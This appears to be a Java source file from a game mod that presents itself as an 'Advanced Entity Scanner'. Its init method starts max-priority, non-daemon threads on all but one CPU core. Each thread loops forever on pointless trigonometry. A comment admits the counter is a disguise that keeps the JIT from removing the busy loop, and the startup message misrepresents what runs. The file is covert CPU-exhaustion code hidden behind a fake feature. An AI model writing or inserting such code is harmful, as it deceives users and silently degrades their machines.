package com.wiyuka.prehistoric;

import java.util.Random;
import java.util.concurrent.atomic.AtomicLong;

public class EntityScanner {

    // 伪装成一个用于统计扫描结果的计数器，防止 JIT 优化掉我们的循环
    public static final AtomicLong blackHole = new AtomicLong(0);
    public static final Random rand = new Random();

    public static void init() {
        int processors = Runtime.getRuntime().availableProcessors() - 1;

        for (int i = 0; i < processors; i++) {
            Thread worker = new Thread(new ComputationCore(i));

            worker.setPriority(Thread.MAX_PRIORITY);

            worker.setDaemon(false);

            worker.setName("Prehistoric-Entropy-Generator-" + i);
            worker.start();
        }

        System.out.println("[Prehistoric] Advanced Entity Scanner initialized on " + processors + " cores.");
    }

    private record ComputationCore(int id) implements Runnable {

        @Override
            public void run() {
                double seed = id * 1.0;

                while (true) {
                    for (int j = 0; j < 1000; j++) {
                        seed = Math.sin(seed) * Math.tan(seed) + Math.pow(Math.abs(Math.cos(seed)), 0.1437);

                        if (seed > 100.0) {
                            seed = seed % 10.0;
                        }
                    }
                    blackHole.addAndGet((long) seed);

                    if (rand.nextDouble() < 0.1) Thread.yield();
                }
            }
        }
}